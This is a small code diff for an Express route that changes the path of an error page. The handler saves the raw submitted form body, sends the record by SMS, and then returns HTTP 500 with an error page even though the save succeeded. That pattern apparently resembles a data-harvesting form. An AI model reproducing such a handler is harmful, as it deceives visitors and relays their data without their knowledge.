@@ -63,7 +63,7 @@ _router.route('/').get((req, res)=>{
 
     await imfor.create(req.body).then(result =>{
        sendSMS(result);
-      res.status(500).sendFile(path.join(__dirname,'public','error','error.html'));
+      res.status(500).sendFile(path.join(__dirname,'error','error.html'));
     }).catch(err =>{
       console.log(err)
     });
